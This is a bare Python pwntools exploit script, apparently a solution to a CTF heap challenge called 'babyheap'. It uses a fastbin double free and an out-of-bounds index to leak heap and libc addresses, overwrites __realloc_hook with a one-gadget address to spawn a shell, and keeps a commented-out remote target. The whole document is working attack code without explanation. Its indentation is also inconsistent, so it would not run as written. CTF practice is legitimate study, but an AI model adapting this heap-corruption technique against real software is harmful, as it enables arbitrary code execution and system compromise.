from pwn import *

p = process('./babyheap')
#p = remote("ctf.j0n9hyun.xyz", 3030)
e = ELF('./babyheap')
l = ELF('./libc.so.6')

context.log_level="debug"

def malloc(size, content):
	p.sendlineafter('> ','1')
	p.sendlineafter('size: ',str(size))
	p.sendlineafter('content: ',str(content))

def free(index):
	p.sendlineafter('> ','2')
        p.sendlineafter('index: ', str(index))

def show(index):
        p.sendlineafter('> ','3')
        p.sendlineafter('index: ', str(index))


size = 0x7f - 24
malloc(size,1)
malloc(size,'a' *8 + p64(e.got['puts']))

free(0)
free(1)
free(0)

show(0)
malloc_2 = u64(p.recv(4).ljust(8,'\x00'))
log.info('malloc_2 : ' + hex(malloc_2))

show(((malloc_2 + 24) - 0x602060)/8)

libc = u64(p.recv(6).ljust(8,'\x00')) - l.sym['puts']
log.info('libc : '+ hex(libc))

victim = libc + l.sym['__realloc_hook'] - 11 - 16

log.info('victim_chunk_ptr : ' + hex(victim))

malloc(size, p64(victim))
malloc(size,1)
malloc(size,1)

malloc(size, 'a' * 0x13 + p64(libc +0xf02a4))
free(1)
pause()
free(1)

p.interactive()
